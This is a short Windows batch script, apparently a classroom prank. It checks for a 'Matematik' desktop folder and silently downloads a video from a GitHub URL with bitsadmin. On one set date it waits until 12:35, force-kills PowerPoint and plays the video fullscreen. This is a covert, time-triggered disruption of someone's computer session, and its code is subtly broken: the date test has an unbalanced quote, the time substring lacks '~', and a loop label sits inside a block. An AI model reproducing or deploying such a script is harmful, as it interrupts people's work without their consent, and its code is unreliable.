@echo off

if not exist "%USERPROFILE%\Desktop\Matematik" exit

if not exist "%TEMP%\ataturk.mp4" (
bitsadmin /transfer vidjob /download /priority high "https://raw.githubusercontent.com/similartobash/rc/main/video.mp4" "%TEMP%\ataturk.mp4"
)

if "%date% == "Cum 16.12.2022" (
:timeloop
if "%time:0,5%" == "12:35" (
taskkill /f /im POWERPNT.EXE
set video2play="%TEMP%\ataturk.mp4"
set wmplayer="%ProgramFiles(x86)%\Windows Media Player\wmplayer.exe" /prefetch:1
%wmplayer% %video2play% /fullscreen
) else (
timeout /t 10
goto :timeloop
)
)

exit
